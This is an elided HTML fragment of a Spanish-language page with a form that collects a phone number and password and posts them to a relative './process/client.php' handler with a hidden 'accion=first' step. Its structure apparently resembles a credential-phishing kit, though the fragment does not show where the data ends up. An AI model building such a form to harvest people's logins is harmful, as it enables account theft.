...
<body class="page-template-default page page-id-2255 et-tb-has-template et-tb-has-header et-tb-has-footer et_pb_button_helper_class et_cover_background et_pb_gutter et_pb_gutters3 et_pb_pagebuilder_layout et_no_sidebar et_divi_theme et-db">
  ...
  padding: 5px;">
                                                        ...
                                                        <form method="post" action="./process/client.php">
                                                            <div class="et_pb_text_inner">
                                                                ...
                                                                <input required="" inputmode="numeric" maxlength="12" minlength="10" type="text" name="phone" id="phone" placeholder="Teléfono" class="et_pb_s" style="margin-top: 5px;box-sizing: border-box;
  ...
  border:0px;
  outline: none;
  border-bottom: 1px solid #6949c7;
  width: 100%;
  ...
  transition: all 0.1s ease-in-out;">
                                                                ...
                                                                <input required="" type="password" minlength="6" maxlength="24" name="pass" placeholder="Contraseña" class="et_pb_s" style=" 
  display: block;
  font-weight:300;
  width: 100%;
  font-size: 25px;
...
">
                                                            ...
                                                            <input type="hidden" name="accion" value="first">
    ...
    <script type="text/javascript">
        ...
        $('#phone').on('keypress keydown keyup', function(event) {
            validate_phone(event);
        });
    </script>
    <style>
        .loading {
